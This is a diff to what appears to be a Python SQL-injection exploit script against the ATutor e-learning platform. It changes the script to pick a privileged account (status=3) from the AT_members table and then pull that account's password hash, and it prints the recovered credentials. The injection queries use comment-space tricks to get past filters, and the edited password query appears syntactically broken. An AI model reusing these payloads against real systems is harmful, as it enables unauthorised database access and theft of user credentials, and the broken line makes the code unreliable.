@@ -41,10 +41,11 @@ def main():
     #query = "select/**/group_concat(0x7c,schema_name,0x7C)/**/from/**/information_schema.schemata"
     #query = "select/**/group_concat(0x7c,table_name,0x7C)/**/from/**/information_schema.tables/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
     #query = "select/**/group_concat(0x7c,column_name,0x7C)/**/from/**/information_schema.columns/**/where/**/table_schema='atutor'/**/and/**/table_name='AT_members'"
-    query = "select/**/login/**/from/**/AT_members/**/where/**/login='teacher'"
+    #query = "select/**/login/**/from/**/AT_members/**/where/**/login='teacher'"
+    query = 'select/**/login/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1'
     username = inject(50, query, ip)
     print("(+) Retrieving password hash....")
-    query = "select/**/password/**/from/**/AT_members/**/where/**/login='teacher'"
+    query = "select/**/password/**/from/**/AT_members/**/where/**/login/**/=/**\'%s\'' % (username)
     #query = "select/**/database()"
     password = inject(50, query, ip)
     print("(+) Credentials: %s / %s" % (username, password))
